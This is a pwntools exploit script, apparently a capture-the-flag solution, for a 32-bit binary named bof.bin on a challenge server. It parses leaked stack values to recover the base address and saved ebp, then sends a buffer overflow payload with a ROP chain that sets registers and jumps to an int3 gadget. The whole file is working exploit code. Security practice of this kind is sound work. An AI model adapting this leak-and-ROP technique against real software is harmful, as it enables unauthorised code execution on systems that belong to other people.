#!/usr/bin/env python3

from pwn import *

exe = ELF("./bof.bin")
context.binary = exe
#context.log_level = "debug"

def conn():
    if args.LOCAL:
        #return process([exe.path])
        return gdb.debug(exe.path)
    else:
        return remote("maze.chal.perfect.blue", 1)

pop3ret = 0x00000396  # pop esi; pop edi; pop ebp; ret
moveax = 0x00000401  # mov eax,0x1; jmp 1422; mov ebx,DWORD PTR [ebp-0x4]; leave; ret
int3 = 0x00000760  # cc

def main():
    r = conn()
    #pause()
    print(r.clean())
    r.sendline("n")

    # Get the base address from the leak
    leak = r.recvuntil(b"Input")
    line = leak.decode().split("\n")[-3]
    values = line.split("|")[1].split()
    retaddress = values[3] + values[2] + values[1] + values[0]
    retaddress = int(retaddress, 16)
    baseaddr = retaddress - 0x599
    print("Base address is: " + str(hex(baseaddr)))

    # Get the value for ebp from the leak
    line = leak.decode().split("\n")[-4]
    values = line.split("|")[1].split()
    ebpaddress = values[7] + values[6] + values[5] + values[4]
    ebpaddress = int(ebpaddress, 16)

    # Write "flag" to the required location
    buf = b"A" * 48
    buf += p32(0x67616c66)

    # Overwrite the return address to gain control
    buf += p32(ebpaddress)
    buf += p32(ebpaddress)
    buf += p32(ebpaddress)

    # Build the ROP chain
    # mov eax, 1
    buf += p32(baseaddr + moveax)
    # Junk values to fix the stupid leave instruction
    buf += p32(baseaddr + 43)
    buf += p32(baseaddr + 43)
    buf += p32(baseaddr + 43)

    # mov edi, 0x31337; mov esi, 0x1337"
    buf += p32(baseaddr + pop3ret)
    buf += p32(0x1337)  # esi
    buf += p32(0x31337)  # edi
    buf += p32(0xdeadbeef)  # ebp

    # int3
    buf += p32(baseaddr + int3)

    r.sendline(buf)
    r.interactive()

if __name__ == "__main__":
    main()

